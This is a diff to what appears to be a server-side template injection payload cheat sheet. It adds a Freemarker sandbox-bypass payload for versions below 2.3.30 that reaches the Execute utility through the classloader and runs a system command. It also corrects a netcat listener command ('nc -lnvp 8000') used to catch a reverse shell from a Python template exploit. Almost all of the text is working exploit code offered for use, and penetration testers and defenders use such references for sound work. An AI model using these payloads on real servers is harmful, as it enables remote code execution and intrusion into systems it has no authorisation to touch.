@@ -253,6 +253,18 @@ The template can be `${3*3}` or the legacy `#{3*3}`
 ${"freemarker.template.utility.Execute"?new()("id")}
 ```
 
+### Freemarker - Sandbox bypass
+
+:warning: only works on Freemarker versions below 2.3.30
+
+```js
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
+```
+
 ## Pebble
 
 ### Pebble - Basic injection
@@ -396,7 +408,7 @@ Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 Listen for connection
 
 ```bash
-nv -lnvp 8000
+nc -lnvp 8000
 ```
 
 #### Exploit the SSTI by calling subprocess.Popen.
